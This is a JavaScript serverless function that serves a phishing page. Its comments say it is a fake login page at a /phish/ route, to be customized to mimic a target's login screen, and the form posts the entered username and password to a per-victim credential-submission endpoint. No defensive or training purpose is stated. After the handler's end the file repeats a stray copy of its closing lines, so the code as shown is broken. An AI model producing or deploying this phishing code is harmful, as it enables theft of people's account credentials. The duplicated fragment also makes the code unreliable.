const { send } = require('micro');
const { parse } = require('url');

// This serverless function serves the fake login HTML page.
module.exports = async (req, res) => {
    // Extract the uniqueId from the URL path (e.g., /phish/abcdefg)
    const { pathname, query } = parse(req.url, true); // parse(..., true) to get query params
    const fullUniqueId = pathname.split('/').pop(); // This will be like "randomHash_requesterUserId"

    // Extract username and password from query parameters if provided
    const defaultUsername = 'user';
    const defaultPassword = 'password123';

    const embeddedUsername = query.u || defaultUsername; // 'u' for username
    const embeddedPassword = query.p || defaultPassword; // 'p' for password

    // The HTML content for your fake login page.
    // CUSTOMIZE THIS to mimic the login page of your target!
    const fakeLoginPageHtml = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; }
            .login-container { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); width: 300px; text-align: center; }
            h2 { margin-bottom: 20px; color: #1c1e21; }
            input[type="text"], input[type="password"] { width: calc(100% - 20px); padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
            button:hover { background-color: #166fe5; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Sign In</h2>
            <form action="/submit-credentials/${fullUniqueId}" method="POST">
                <input type="text" name="username" placeholder="${embeddedUsername}" value="${embeddedUsername}" required>
                <input type="password" name="password" placeholder="${embeddedPassword}" value="${embeddedPassword}" required>
                <button type="submit">Log In</button>
            </form>
            <p style="font-size: 12px; margin-top: 15px;"><a href="#" style="color: #1877f2; text-decoration: none;">Forgot password?</a></p>
        </div>
    </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    send(res, 200, fakeLoginPageHtml);
};        </div>
    </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    send(res, 200, fakeLoginPageHtml);
};
